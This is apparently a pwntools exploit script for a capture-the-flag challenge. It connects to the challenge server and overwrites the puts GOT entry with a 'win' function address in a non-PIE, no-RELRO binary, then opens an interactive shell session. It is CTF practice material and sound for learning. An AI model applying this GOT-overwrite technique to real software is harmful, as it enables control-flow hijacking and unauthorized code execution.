from pwn import *
import subprocess
import os
import sys
sys.path.append("../CTF_setup/Utils")
from utils import *
from file_struct import *

exe = ELF("./chall_patched")
context.binary = exe

final = 1


enc = lambda a: a.encode() if isinstance(a, str) else a
sla = lambda a, b: io.sendlineafter(enc(a), enc(b))
snl = lambda a: io.sendline(enc(a))
sna = lambda a, b: io.sendafter(enc(a), enc(b))
snd = lambda a: io.send(enc(a))
rcu = lambda a: io.recvuntil(enc(a), drop=True)
rcv = lambda a: io.recv(enc(a))
rcl = lambda: io.recvline()
p24 = lambda a: p32(a)[:-1]
l64 = lambda a: u64(a.ljust(8, b"\x00"))
l32 = lambda a: u64(a.ljust(4, b"\x00"))
l16 = lambda a: u64(a.ljust(2, b"\x00"))
sen = lambda a: str(a).encode()
mangle = lambda ptr, pos: ptr ^ (pos >> 12)

def debug():
    pid = io.proc.pid
    subprocess.run(["gnome-terminal", "--", "zsh", "-c", "gdb -nx -x ../CTF_setup/Utils/custom_gdb.py -x g -p " + str(pid)])

if final == 1:
    io = remote("chall.0xfun.org", 25590)
else:
    io = process()



''' let's pwn '''
'''nopie norelro -> plt override'''

win = 0x401236
puts = 0x403430

sla(b"GOT", str(puts).encode())
sla(b"GOT", str(win).encode())

''' end '''



io.interactive()

